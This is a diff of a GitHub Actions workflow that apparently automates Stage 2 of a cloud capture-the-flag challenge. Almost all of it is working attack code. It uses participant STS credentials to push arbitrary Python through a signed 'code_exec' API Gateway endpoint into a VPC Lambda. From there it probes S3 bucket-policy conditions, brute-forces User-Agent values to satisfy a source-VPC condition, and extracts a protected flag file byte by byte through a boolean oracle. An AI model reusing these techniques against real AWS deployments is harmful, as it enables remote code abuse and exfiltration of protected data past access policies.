@@ -1,10 +1,16 @@
 name: Cloud Escape - Stage 2 (Miss Me Yet?)
-run-name: Stage 2 - participant STS → code_exec
+run-name: Stage 2 - participant STS → path-style UNSIGNED
 #
-# CRITICAL FINDING (GHA run 30890450186):
-#   cicdRole (OIDC / Stage 1) is NOT authorized to invoke
+# CRITICAL (GHA run 30890450186):
+#   cicdRole (OIDC / Stage 1) CANNOT invoke
 #   https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
-# Stage 2 must use platform ctf_participant_role STS (paste below or as secrets).
+# Stage 2 MUST use platform ctf_participant_role STS (workflow_dispatch inputs).
+#
+# Attack path (current intel):
+#   participant STS → SigV4 code_exec → Lambda VPC
+#   → path-style UNSIGNED GetObject (virtual-host DNS fails)
+#   → Statement2: aws:SourceVpc ∧ aws:UserAgent
+#   → never submit decoy 00000000000000000000
 #
 on:
   workflow_dispatch:
@@ -18,6 +24,18 @@ on:
       aws_session_token:
         description: "Participant AWS_SESSION_TOKEN"
         required: true
+      extra_uas:
+        description: "Optional extra UAs (JSON array string) appended to default batch"
+        required: false
+        default: "[]"
+      recover_flag:
+        description: "If UNSIGNED hit, run boolean char oracle for flag body"
+        required: false
+        default: "true"
+        type: choice
+        options:
+          - "true"
+          - "false"
 
 permissions:
   contents: read
@@ -26,7 +44,20 @@ jobs:
   stage2-participant-exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: "1) Configure participant STS"
+      - name: "0) Mask participant STS (never echo secrets)"
+        env:
+          AWS_ACCESS_KEY_ID: ${{ inputs.aws_access_key_id }}
+          AWS_SECRET_ACCESS_KEY: ${{ inputs.aws_secret_access_key }}
+          AWS_SESSION_TOKEN: ${{ inputs.aws_session_token }}
+        run: |
+          set -e
+          # Prevent accidental log leaks of workflow_dispatch secrets
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+          echo "STS inputs masked."
+
+      - name: "1) Configure participant STS + surface check"
         env:
           AWS_ACCESS_KEY_ID: ${{ inputs.aws_access_key_id }}
           AWS_SECRET_ACCESS_KEY: ${{ inputs.aws_secret_access_key }}
@@ -35,28 +66,47 @@ jobs:
         run: |
           set -e
           echo "=== IDENTITY (must be ctf_participant_role) ==="
-          aws sts get-caller-identity
-          echo "=== LOG BUCKET (should work) ==="
-          aws s3api list-objects-v2 --bucket logd8a2f72fe43094e8 --max-items 3 --query 'KeyCount' --output text
-          echo "=== USER BUCKET (expect AccessDenied) ==="
-          aws s3api list-objects-v2 --bucket userd8a2f72fe43094e8 --max-items 1 2>&1 | head -5 || true
+          ID_JSON=$(aws sts get-caller-identity --output json)
+          echo "$ID_JSON"
+          ARN=$(echo "$ID_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin)['Arn'])")
+          case "$ARN" in
+            *ctf_participant_role*) echo "OK: participant role" ;;
+            *)
+              echo "::error::Wrong identity. Stage 2 requires ctf_participant_role, not cicdRole/lambdaRole."
+              echo "Got: $ARN"
+              exit 1
+              ;;
+          esac
+          echo "=== LOG BUCKET (expect ALLOW) ==="
+          aws s3api list-objects-v2 --bucket logd8a2f72fe43094e8 --max-items 3 \
+            --query '{KeyCount:KeyCount,Sample:Contents[0].Key}' --output json || true
+          echo "=== USER BUCKET list (expect AccessDenied) ==="
+          aws s3api list-objects-v2 --bucket userd8a2f72fe43094e8 --max-items 1 2>&1 | head -8 || true
 
-      - name: "2) code_exec path-style exploit probes"
+      - name: "2) code_exec path-style UNSIGNED probes"
+        id: probes
         env:
           AWS_ACCESS_KEY_ID: ${{ inputs.aws_access_key_id }}
           AWS_SECRET_ACCESS_KEY: ${{ inputs.aws_secret_access_key }}
           AWS_SESSION_TOKEN: ${{ inputs.aws_session_token }}
           AWS_DEFAULT_REGION: us-east-1
+          EXTRA_UAS: ${{ inputs.extra_uas }}
+          RECOVER_FLAG: ${{ inputs.recover_flag }}
         run: |
+          set -e
           pip install botocore -q
           python3 << 'PY'
-          import json, base64, os, urllib.request, urllib.error, time
+          import json, base64, os, urllib.request, urllib.error, time, sys
+          from pathlib import Path
           from botocore.auth import SigV4Auth
           from botocore.awsrequest import AWSRequest
           from botocore.credentials import Credentials
 
           API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
           USER = "userd8a2f72fe43094e8"
+          FLAG_KEY = "flag.txt"
+          PATH_URL = f"https://s3.us-east-1.amazonaws.com/{USER}/{FLAG_KEY}"
+          VIRT_URL = f"https://{USER}.s3.us-east-1.amazonaws.com/{FLAG_KEY}"
           OK = '{"result":"Code executed successfully"}'
           FAIL = '{"error":"Something went wrong!"}'
           creds = Credentials(
@@ -64,20 +114,24 @@ jobs:
               os.environ["AWS_SECRET_ACCESS_KEY"],
               os.environ["AWS_SESSION_TOKEN"],
           )
-          AK, SK, TK = (
-              os.environ["AWS_ACCESS_KEY_ID"],
-              os.environ["AWS_SECRET_ACCESS_KEY"],
-              os.environ["AWS_SESSION_TOKEN"],
-          )
+          AK = os.environ["AWS_ACCESS_KEY_ID"]
+          SK = os.environ["AWS_SECRET_ACCESS_KEY"]
+          TK = os.environ["AWS_SESSION_TOKEN"]
+          results = {"taxonomy": {}, "unsigned_hits": [], "flag": None, "notes": []}
 
           def exec_code(code, timeout=30):
               b64 = base64.b64encode(code.encode()).decode()
               payload = json.dumps({"code": b64})
-              r0 = AWSRequest(method="POST", url=API, data=payload,
-                              headers={"Content-Type": "application/json"})
+              r0 = AWSRequest(
+                  method="POST",
+                  url=API,
+                  data=payload,
+                  headers={"Content-Type": "application/json"},
+              )
               SigV4Auth(creds, "execute-api", "us-east-1").add_auth(r0)
-              req = urllib.request.Request(API, data=payload.encode(),
-                                           headers=dict(r0.headers), method="POST")
+              req = urllib.request.Request(
+                  API, data=payload.encode(), headers=dict(r0.headers), method="POST"
+              )
               try:
                   with urllib.request.urlopen(req, timeout=timeout) as r:
                       return r.read().decode().strip()
@@ -85,6 +139,7 @@ jobs:
                   return e.read().decode().strip() if hasattr(e, "read") else str(e)
 
           def maj(code, tries=5):
+              """Strict majority on exact OK/FAIL only; ignore multi-tenant junk."""
               votes = []
               for _ in range(tries):
                   b = exec_code(code)
@@ -93,45 +148,81 @@ jobs:
                   elif b == FAIL:
                       votes.append(False)
                   else:
-                      print("junk", b[:140].replace("\n", " "))
-                      time.sleep(0.2)
+                      print("junk", b[:140].replace("\n", " "), flush=True)
+                      time.sleep(0.25)
                       continue
                   if len(votes) >= 3 and len(set(votes[-3:])) == 1:
                       return votes[-1]
               return max(set(votes), key=votes.count) if votes else None
 
-          print("smoke pass", maj("pass"), "fail", maj("assert False"))
-          print("path 403", maj("""
+          def report(name, val):
+              results["taxonomy"][name] = val
+              print(f"{name}: {val}", flush=True)
+
+          # --- smoke / oracle hygiene ---
+          report("smoke_pass", maj("pass"))
+          report("smoke_fail", maj("assert False"))
+          if results["taxonomy"]["smoke_pass"] is not True or results["taxonomy"]["smoke_fail"] is not False:
+              results["notes"].append("oracle unreliable (junk/pollution); retry with one control process")
+              print("WARN: boolean oracle noisy", flush=True)
+
+          # --- path-style UNSIGNED reaches S3 (403 = connectivity OK, wrong UA) ---
+          report(
+              "path_style_unsigned_403",
+              maj(
+                  f"""
           import urllib.request, urllib.error
-          req=urllib.request.Request('https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',headers={'User-Agent':'x'})
+          req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':'x'}})
           try:
               urllib.request.urlopen(req,timeout=8)
               assert False
           except urllib.error.HTTPError as e:
               assert e.code==403
-          """))
-          print("virt URLError", maj("""
+          """
+              ),
+          )
+
+          # --- virtual-host DNS fails in Lambda VPC ---
+          report(
+              "virtual_host_urlerror",
+              maj(
+                  f"""
           import urllib.request, urllib.error
-          req=urllib.request.Request('https://userd8a2f72fe43094e8.s3.us-east-1.amazonaws.com/flag.txt',headers={'User-Agent':'x'})
+          req=urllib.request.Request({VIRT_URL!r},headers={{'User-Agent':'x'}})
           try:
               urllib.request.urlopen(req,timeout=6)
               assert False
           except urllib.error.URLError as e:
               assert not isinstance(e, urllib.error.HTTPError)
-          """))
-          print("lambda identity deny", maj("""
+          """
+              ),
+          )
+
+          # --- lambdaRole signed → identity-based deny ---
+          report(
+              "lambda_identity_deny",
+              maj(
+                  f"""
           import boto3
           from botocore.config import Config
           from botocore.exceptions import ClientError
-          s3=boto3.client('s3',region_name='us-east-1',endpoint_url='https://s3.us-east-1.amazonaws.com',
-            config=Config(s3={'addressing_style':'path'},connect_timeout=3,read_timeout=5,retries={'max_attempts':1}))
+          s3=boto3.client('s3',region_name='us-east-1',
+            endpoint_url='https://s3.us-east-1.amazonaws.com',
+            config=Config(s3={{'addressing_style':'path'}},connect_timeout=3,read_timeout=5,retries={{'max_attempts':1}}))
           try:
-              s3.get_object(Bucket='userd8a2f72fe43094e8',Key='flag.txt')
+              s3.get_object(Bucket={USER!r},Key={FLAG_KEY!r})
               assert False
           except ClientError as e:
-              assert 'identity-based' in e.response.get('Error',{}).get('Message','')
-          """))
-          print("participant-in-lambda resource deny", maj(f"""
+              assert 'identity-based' in e.response.get('Error',{{}}).get('Message','')
+          """
+              ),
+          )
+
+          # --- participant creds inside Lambda → resource-based deny (conditions incomplete) ---
+          report(
+              "participant_in_lambda_resource_deny",
+              maj(
+                  f"""
           import boto3
           from botocore.config import Config
           from botocore.exceptions import ClientError
@@ -143,35 +234,173 @@ jobs:
               request.headers['User-Agent']='Amazon CloudFront'
           s3.meta.events.register('before-send.s3.*', set_ua)
           try:
-              s3.get_object(Bucket='userd8a2f72fe43094e8',Key='flag.txt')
+              s3.get_object(Bucket={USER!r},Key={FLAG_KEY!r})
               assert False
           except ClientError as e:
               assert 'resource-based' in e.response.get('Error',{{}}).get('Message','')
-          """))
+          """
+              ),
+          )
 
-          # Stmt2: UNSIGNED path-style batch (targeted UAs only)
+          # --- Stmt2: per-UA path-style UNSIGNED GetObject ---
           uas = [
-              "Amazon CloudFront","CloudFront","AmazonS3","aws-internal/3",
-              "junior_developer","Miss Me Yet?","???","Test Site",
-              "System Documentation","This is me","pretty sure I deleted it all",
-              "I had a lot of fun doing it!","REDACTED","bucket_policy.json","",
+              "Amazon CloudFront",
+              "CloudFront",
+              "AmazonS3",
+              "aws-internal/3",
+              "junior_developer",
+              "Miss Me Yet?",
+              "Miss Me Yet",
+              "???",
+              "Test Site",
+              "System Documentation",
+              "This is me",
+              "pretty sure I deleted it all",
+              "I had a lot of fun doing it!",
+              "REDACTED",
+              "bucket_policy.json",
+              "really fixed bugs this time",
+              "super secret project",
+              "I am a junior developer",
+              "Code executed successfully",
+              "Something went wrong!",
+              "",
           ]
-          print("unsigned batch", maj(f"""
-          import urllib.request, json
-          uas=json.loads({json.dumps(uas)!r})
-          hit=False
+          try:
+              extra = json.loads(os.environ.get("EXTRA_UAS") or "[]")
+              if isinstance(extra, list):
+                  for u in extra:
+                      if isinstance(u, str) and u not in uas:
+                          uas.append(u)
+              else:
+                  results["notes"].append("extra_uas not a JSON array; ignored")
+          except Exception as e:
+              results["notes"].append(f"extra_uas parse error: {e}")
+
+          print(f"unsigned UA batch size={len(uas)}", flush=True)
+          hit_ua = None
           for ua in uas:
-              req=urllib.request.Request(
-                'https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',
-                headers={{'User-Agent':ua}})
-              try:
-                  with urllib.request.urlopen(req,timeout=2.5) as r:
-                      if r.status==200 and len(r.read())>0:
-                          hit=True
+              code = f"""
+          import urllib.request, urllib.error
+          req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{ua!r}}})
+          try:
+              with urllib.request.urlopen(req,timeout=3) as r:
+                  body=r.read()
+                  assert r.status==200 and len(body)>0
+          except Exception:
+              assert False
+          """
+              ok = maj(code, tries=3)
+              print(f"  UA {ua!r} -> {ok}", flush=True)
+              if ok is True:
+                  hit_ua = ua
+                  results["unsigned_hits"].append(ua)
+                  break
+
+          report("unsigned_any_hit", hit_ua is not None)
+          if hit_ua is not None:
+              print(f"HIT UA={hit_ua!r}", flush=True)
+              results["notes"].append(f"path-style UNSIGNED hit with UA={hit_ua!r}")
+
+              # Recover flag via boolean char oracle (stdout suppressed inside Lambda)
+              if (os.environ.get("RECOVER_FLAG") or "true").lower() == "true":
+                  # length
+                  flen = None
+                  for n in range(0, 65):
+                      if maj(
+                          f"""
+          import urllib.request
+          req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{hit_ua!r}}})
+          body=urllib.request.urlopen(req,timeout=5).read()
+          assert len(body)=={n}
+          """,
+                          tries=3,
+                      ):
+                          flen = n
                           break
-              except Exception:
-                  pass
-          assert hit
-          """))
-          print("DONE")
+                  print(f"flag length={flen}", flush=True)
+                  if flen is not None and flen > 0:
+                      out = []
+                      for i in range(flen):
+                          ch = None
+                          # printable ASCII first; then broader
+                          alphabet = (
+                              "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                              "{}_-.=+/!?@#$%&*():;[]<>~, \n\r\t"
+                          )
+                          for c in alphabet:
+                              if maj(
+                                  f"""
+          import urllib.request
+          req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{hit_ua!r}}})
+          body=urllib.request.urlopen(req,timeout=5).read()
+          assert body[{i}:{i+1}]=={c.encode()!r}
+          """,
+                                  tries=3,
+                              ):
+                                  ch = c
+                                  break
+                          if ch is None:
+                              # binary nibble fallback
+                              for b in range(256):
+                                  if maj(
+                                      f"""
+          import urllib.request
+          req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{hit_ua!r}}})
+          body=urllib.request.urlopen(req,timeout=5).read()
+          assert body[{i}]=={b}
+          """,
+                                      tries=2,
+                                  ):
+                                      ch = chr(b) if 32 <= b < 127 else f"\\x{b:02x}"
+                                      break
+                          out.append(ch if ch is not None else "?")
+                          print(f"  char[{i}]={out[-1]!r}", flush=True)
+                      flag = "".join(out)
+                      results["flag"] = flag
+                      print(f"RECOVERED_FLAG={flag}", flush=True)
+                      Path("/tmp/STAGE2_FLAG.txt").write_text(flag + "\n", encoding="utf-8")
+                  else:
+                      results["notes"].append("hit but length oracle failed")
+          else:
+              results["notes"].append(
+                  "no UA hit in default+extra batch; residual is Statement2 User-Agent"
+              )
+
+          Path("/tmp/stage2_probe_results.json").write_text(
+              json.dumps(results, indent=2), encoding="utf-8"
+          )
+          summary = [
+              "## Stage 2 probe results",
+              "",
+              f"- path-style UNSIGNED 403 (connectivity): `{results['taxonomy'].get('path_style_unsigned_403')}`",
+              f"- virtual-host URLError: `{results['taxonomy'].get('virtual_host_urlerror')}`",
+              f"- lambda identity deny: `{results['taxonomy'].get('lambda_identity_deny')}`",
+              f"- participant-in-lambda resource deny: `{results['taxonomy'].get('participant_in_lambda_resource_deny')}`",
+              f"- unsigned any hit: `{results['taxonomy'].get('unsigned_any_hit')}`",
+              f"- hit UAs: `{results['unsigned_hits']}`",
+              f"- flag: `{results['flag'] or '[NOT CAPTURED]'}`",
+              "",
+              "Notes:",
+          ]
+          for n in results["notes"]:
+              summary.append(f"- {n}")
+          summary.append("")
+          summary.append("Hard rule: never submit `00000000000000000000`.")
+          Path(os.environ["GITHUB_STEP_SUMMARY"]).write_text(
+              "\n".join(summary) + "\n", encoding="utf-8"
+          )
+          print("DONE", flush=True)
+          if results["taxonomy"].get("smoke_pass") is not True:
+              sys.exit(2)
           PY
+
+      - name: "3) Upload probe artifacts"
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: stage2-probe-results
+          path: |
+            /tmp/stage2_probe_results.json
+            /tmp/STAGE2_FLAG.txt
+          if-no-files-found: ignore
